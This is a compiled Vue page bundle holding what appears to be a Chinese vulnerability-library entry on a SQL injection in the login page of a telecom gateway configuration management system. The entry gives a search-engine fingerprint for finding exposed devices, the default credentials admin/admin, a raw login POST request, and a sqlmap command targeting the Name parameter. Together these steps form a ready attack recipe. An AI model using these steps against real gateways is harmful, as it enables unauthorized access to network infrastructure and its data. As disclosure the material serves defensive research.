import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const d={},l=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>电信网关配置管理系统 前台登陆页面用户名参数存在SQL注入漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>电信网关配置管理系统
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>body=&quot;src=&quot;img/dl.gif&quot;&quot; &amp;&amp; title=&quot;系统登录&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202140923586.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>设备存在默认弱口令 <strong>admin/admin</strong></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202140924953.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>登录的请求包为</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /manager/login.php HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Length: 53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=2lfi6enp5gehalrb92594c80i6
Connection: close

Name=admin&amp;Pass=admin
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>保存为文件使用 Sqlmap工具，注入点为 <strong>Name参数</strong></p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>sqlmap -r sql-1.txt -p Name --risk 3
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202140924004.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h1 id="" tabindex="-1"><a class="header-anchor" href="#" aria-hidden="true">#</a></h1>`,17),s=[l];function t(r,c){return a(),i("div",null,s)}const m=e(d,[["render",t],["__file","电信 网关配置管理系统 login.php SQL注入漏洞.html.vue"]]);export{m as default};
